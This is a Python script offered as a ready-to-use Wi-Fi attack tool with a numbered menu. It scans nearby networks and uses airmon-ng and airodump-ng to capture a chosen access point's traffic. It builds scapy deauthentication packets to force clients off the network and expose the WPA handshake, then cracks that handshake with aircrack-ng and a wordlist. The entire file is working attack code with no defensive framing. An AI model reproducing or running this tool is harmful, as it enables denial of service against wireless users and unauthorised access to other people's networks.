import wifi
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import shutil

def print_full_desktop_width():
    terminal_width = shutil.get_terminal_size().columns
    equals_string = "=" * terminal_width
    print(equals_string+"\n")
def print_centered_text(text):
    color_start = "\033[{}m".format(33)
    color_end = "\033[0m"
    terminal_width = shutil.get_terminal_size().columns
    padding_width = (terminal_width - len(text)) // 2
    padding_string = "*" * padding_width
    print(padding_string + color_start + text + color_end + padding_string+"\n")
    
print_full_desktop_width()
print_centered_text("  IMPORTANT ** NOTE  ")
print_centered_text("  PLEASE RUN THIS TOOL WITH SUPER USER OTHERWISE THE SCRIPT WILL NOT WORK  ")
print_centered_text("  YOU HAVE TO WORK WITH TWO TERMINALS  ")
print_full_desktop_width()

s='''                             
                                        
               :+#-       .##=.         
             .*#%*.        =%%%=        
            .####+         .%%%%+       
            +%####+=+++++++#%%%%%       
           .#%%%###%%%%%%%%%%%%%%=      
        .=#%%%%#*=--::::--=+*#%%%%%*-   
      :*%%%%*-.                :+#%%%%= 
      %%%#=.  .-+*#*.    +##*=:   :*%%%-
      .-:  .=#%%%%#+.    =#%%%%%+:  .-: 
          .%%%%*=.         .-+%%%%+     
           +*+.  .  +****: .   =**:     
               .*%%*%###%*#%#-          
               :%%#=:   .-+%%*          
                 .   -=-.   .           
                    #%%%#:              
                    +%%%*.              
                     .:.                
                                             
'''
color_start = "\033[{}m".format(33)
color_end = "\033[0m"
 
 
print(color_start + s + color_end)

def scan_wifi_networks():
    # Scan for available WiFi networks
    interface=input("Enter your interface name : ")
    networks = wifi.Cell.all(interface)

    if networks:
        print("\nAvailable WiFi Networks:\n")
        n=1
        for network in networks:
            print("Network : ",n)
            print(f"SSID: {network.ssid}\nNetwork Signal: {network.signal}\nEncryption Type: {network.encryption_type}\nMacaddress: {network.address}\nChannel: {network.channel}\n")
            n=n+1
    else:
        print("No WiFi networks found.")

def run_airodump(interface, bssid, path, chnl):
    command1=["sudo", "airmon-ng", "check", "kill"]
    command2=["sudo", "airmon-ng", "start", interface]
    command = ["sudo", "airodump-ng", "-w", path, "-c", chnl, "--bssid", bssid, interface]
    try:
        subprocess.run(command1, check=True)
        subprocess.run(command2, check=True)
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("An error occurred:", e)
def deauth_wifi(ap_mac, iface, count):
    packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(packet, iface=iface, count=count, inter=0.5, verbose=True)


def hacking_wifi(fname,wname):
    command = ["aircrack-ng", fname, "-w", wname]
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("An error occurred:", e)
try:
    while True:
        print("[+] Press 1 to show the available networks..")
        print("[+] Press 2 to select your target..")
        print("[+] Press 3 to block the clients and to capture encrypted password..")
        print("[+] Press 4 to match your captured handshake with wordlist..")
        print("===>>> ",end="")
        ch=int(input())
        if ch==1:
            scan_wifi_networks()
        elif ch==2:
            print_centered_text("  PLEASE RUN THE THIRD COMMAND ON DIFFERENT TERMINAL SO THAT HANDSHAKE CAN BE CAPTURED  ")
            bsid=input("Enter the bssid id : ")
            inter=input("Enter the interface name : ")
            path=input("Enter the path and file name : ")
            chnl=input("Enter the channel : ")
            run_airodump(inter, bsid, path,chnl)
        elif ch==3:
            ap_mac = input("Enter the target wifi bssid : ")
            i_face= input("Enter the interface name : ")
            count= int(input("Enter the numbers of packed you want to send : "))
            deauth_wifi(ap_mac,i_face,count)
        elif ch==4:
            file_name=input("[+] Enter File name with path : ")
            word=input("[+]Enter your wordlist path and file name : ")
            hacking_wifi(file_name,word)
except KeyboardInterrupt:
    print("You have pressed Ctrl+C. Quitting...")
    exit(0)
